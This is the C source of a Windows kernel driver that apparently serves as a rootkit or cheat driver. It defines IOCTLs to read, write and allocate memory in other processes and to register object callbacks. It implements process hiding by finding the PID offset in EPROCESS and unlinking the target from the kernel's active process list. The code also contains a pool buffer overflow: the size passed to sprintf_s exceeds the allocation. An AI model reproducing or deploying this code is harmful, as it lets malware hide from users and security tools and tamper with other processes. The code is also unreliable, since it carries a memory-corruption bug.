#include <ntddk.h>
#include <stdio.h>
#include <stdlib.h>
#include <ntddk.h>
#include <winapifamily.h> 
#include <ntimage.h>
#include <stdarg.h>


#define PROCESS_CREATE_THREAD  (0x0002)
#define PROCESS_CREATE_PROCESS (0x0080)
#define PROCESS_TERMINATE      (0x0001)
#define PROCESS_VM_WRITE       (0x0020)
#define PROCESS_VM_READ        (0x0010)
#define PROCESS_VM_OPERATION   (0x0008)
#define PROCESS_SUSPEND_RESUME (0x0800)
#define PROCESS_QUERY_INFORMATION (0x0400)
#define PROCESS_DUP_HANDLE (0x0040)
#define PROCESS_SET_QUOTA (0x0100)
#define PROCESS_SET_INFORMATION (0x0200)
#define PROCESS_QUERY_LIMITED_INFORMATION (0x1000)
#define PROCESS_SET_INFORMATION (0x0200)
#define PROCESS_SUSPEND_RESUME (0x0800)

#define NT_DEVICE_NAME	    L"\\Device\\p45h3sys"
#define DOS_DEVICE_NAME            L"\\DosDevices\\p45h3sys"

#define FIRST_IOCTL_INDEX  0x800
#define FILE_DEVICE_myDrv  0x00008000

#define IOCTL_SETUPOBJECTPRECALLBACK   CTL_CODE(FILE_DEVICE_myDrv,  \
                                          FIRST_IOCTL_INDEX + 101,  \
                                          METHOD_BUFFERED,       \
                                          FILE_ANY_ACCESS)

#define IOCTL_FREEPROCFILTERCALLBACK   CTL_CODE(FILE_DEVICE_myDrv,  \
                                          FIRST_IOCTL_INDEX + 102,  \
                                          METHOD_BUFFERED,       \
                                          FILE_ANY_ACCESS)


#define IOCTL_SENDSTRUCTTEST  CTL_CODE(FILE_DEVICE_myDrv,  \
                                          FIRST_IOCTL_INDEX + 103,  \
                                          METHOD_BUFFERED,       \
                                          FILE_ANY_ACCESS)


#define IOCTL_OPENPROCESSCTL  CTL_CODE(FILE_DEVICE_myDrv,  \
                                          FIRST_IOCTL_INDEX + 104,  \
                                          METHOD_BUFFERED,       \
                                          FILE_ANY_ACCESS)

#define IOCTL_WRITEMEMORY  CTL_CODE(FILE_DEVICE_myDrv,  \
                                          FIRST_IOCTL_INDEX + 105,  \
                                          METHOD_BUFFERED,       \
                                          FILE_ANY_ACCESS)


#define IOCTL_READMEMORY  CTL_CODE(FILE_DEVICE_myDrv,  \
                                          FIRST_IOCTL_INDEX + 106,  \
                                          METHOD_BUFFERED,       \
                                          FILE_ANY_ACCESS)

#define IOCTL_ALLOCMEMORY  CTL_CODE(FILE_DEVICE_myDrv,  \
                                          FIRST_IOCTL_INDEX + 107,  \
                                          METHOD_BUFFERED,       \
                                          FILE_ANY_ACCESS)
//patch erprocess
#define IOCTL_HIDEPROCESS  CTL_CODE(FILE_DEVICE_myDrv,  \
                                          FIRST_IOCTL_INDEX + 108,  \
                                          METHOD_BUFFERED,       \
                                          FILE_ANY_ACCESS)

typedef struct _memadactr {
	int i;
	int b;
} memadactr, *pmemadactr;

#define MAXIMUM_FILENAME_LENGTH 256

PVOID _CallBacks_Handle = NULL;

typedef struct _OB_REG_CONTEXT {
	__in USHORT Version;
	__in UNICODE_STRING Altitude;
	__in USHORT ulIndex;
	OB_OPERATION_REGISTRATION *OperationRegistration;
} REG_CONTEXT, *PREG_CONTEXT;

typedef struct _RWRITE_PARAMS {
	int PID;
	int Size;
	char SourceA[1024];
	PVOID TargetA;

} RWRITE_PARAMS, *PRWRITE_PARAMS;

typedef struct _READ_PARAMS {
	int PID;
	int Size;
	PVOID SourceA;

} READ_PARAMS, *PREAD_PARAMS;

typedef struct _VIRTUAL_ALLOC_MEM_PARAMS {
	int PID;
	int Size;
	PVOID TargetA;

} VIRTUAL_ALLOC_MEM_PARAMS, *PVIRTUAL_ALLOC_MEM_PARAMS;

extern UCHAR *PsGetProcessImageFileName(IN PEPROCESS Process);

extern   NTSTATUS PsLookupProcessByProcessId(
	HANDLE ProcessId,
	PEPROCESS *Process
);

typedef PCHAR(*GET_PROCESS_IMAGE_NAME) (PEPROCESS Process);
GET_PROCESS_IMAGE_NAME gGetProcessImageFileName;

LPSTR GetProcessNameFromPid(HANDLE pid);

extern NTSTATUS NtDuplicateObject(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG HandleAttributes,
	ULONG Options
);

extern NTSTATUS NTAPI MmCopyVirtualMemory
(
	PEPROCESS SourceProcess,
	PVOID SourceAddress,
	PEPROCESS TargetProcess,
	PVOID TargetAddress,
	SIZE_T BufferSize,
	KPROCESSOR_MODE PreviousMode,
	PSIZE_T ReturnSize
);
extern
void KeAttachProcess(PEPROCESS Process);

extern
void KeDetachProcess(void);

extern NTSTATUS ZwAllocateVirtualMemory(
	_In_    HANDLE    ProcessHandle,
	_Inout_ PVOID     *BaseAddress,
	_In_    ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T   RegionSize,
	_In_    ULONG     AllocationType,
	_In_    ULONG     Protect
);

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING RegistryPath
);

OB_PREOP_CALLBACK_STATUS ObjectPreCallback(
	IN  PVOID RegistrationContext,
	IN  POB_PRE_OPERATION_INFORMATION OperationInformation
);

VOID ObjectPostCallback(
	IN  PVOID RegistrationContext,
	IN  POB_POST_OPERATION_INFORMATION OperationInformation
);

NTSTATUS RegisterCallbackFunction();
NTSTATUS FreeProcFilter();

NTSTATUS
DriverOpen(IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp);

NTSTATUS
DriverClose(IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp);
PCHAR modifyTaskList(UINT32 pid);
void remove_links(PLIST_ENTRY Current);

typedef struct _DEVICE_EXTENSION
{
	PDRIVER_OBJECT DriverObject;
	PDEVICE_OBJECT DeviceObject;
	PFILE_OBJECT   FileObject;
	HANDLE         Handle;

} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

NTSTATUS
DriverDeviceControl(IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp);

ULONG find_eprocess_pid_offset() {


	ULONG pid_ofs = 0; // The offset we're looking for
	int idx = 0;                // Index 
	ULONG pids[3];				// List of PIDs for our 3 processes
	PEPROCESS eprocs[3];		// Process list, will contain 3 processes

								//Select 3 process PIDs and get their EPROCESS Pointer
	for (int i = 16; idx < 3; i += 4)
	{
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx])))
		{
			pids[idx] = i;
			idx++;
		}
	}


	/*
	Go through the EPROCESS structure and look for the PID
	we can start at 0x20 because UniqueProcessId should
	not be in the first 0x20 bytes,
	also we should stop after 0x300 bytes with no success
	*/

	for (int i = 0x20; i < 0x300; i += 4)
	{
		if ((*(ULONG *)((UCHAR *)eprocs[0] + i) == pids[0])
			&& (*(ULONG *)((UCHAR *)eprocs[1] + i) == pids[1])
			&& (*(ULONG *)((UCHAR *)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i;
			break;
		}
	}

	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);


	return pid_ofs;
}
PCHAR modifyTaskList(UINT32 pid) {
	LPSTR result = ExAllocatePool(NonPagedPool, sizeof(ULONG) + 20);;

	ULONG PID_OFFSET = find_eprocess_pid_offset();

	if (PID_OFFSET == 0) {
		return (PCHAR)"Could not find PID offset!";
	}

	ULONG LIST_OFFSET = PID_OFFSET;
	INT_PTR ptr;
	LIST_OFFSET += sizeof(ptr);

	sprintf_s(result, 2 * sizeof(ULONG) + 30, "Found offsets: %lu & %lu", PID_OFFSET, LIST_OFFSET);

	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	if (*(UINT32 *)CurrentPID == pid) {
		remove_links(CurrentList);
		return (PCHAR)result;
	}

	PEPROCESS StartProcess = CurrentEPROCESS;

	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {
		if (*(UINT32 *)CurrentPID == pid) {
			remove_links(CurrentList);
			return (PCHAR)result;
		}

		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

	return (PCHAR)result;
}

void remove_links(PLIST_ENTRY Current) {
	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	Previous->Flink = Next;
	Next->Blink = Previous;

	
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;

	return;
}